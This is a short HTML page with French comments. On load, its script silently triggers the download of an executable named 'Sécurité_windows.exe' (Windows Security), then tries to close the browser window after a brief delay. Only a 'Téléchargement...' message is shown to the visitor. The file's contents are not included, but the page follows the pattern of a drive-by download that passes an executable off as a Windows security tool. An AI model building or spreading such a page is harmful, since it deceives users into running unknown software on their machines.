<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Téléchargement</title>
    <script>
      window.onload = () => {
        const link = document.createElement("a");
        link.href = "Sécurité_windows.exe"; // ← NOM EXACT
        link.download = "Sécurité_windows.exe"; // ← NOM CIBLE
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        setTimeout(() => {
          window.close(); // ← Peut être ignoré par navigateur
        }, 200); // ⏳ Petit délai avant fermeture
      };
    </script>
  </head>
  <body>
    <p>Téléchargement...</p>
  </body>
</html>
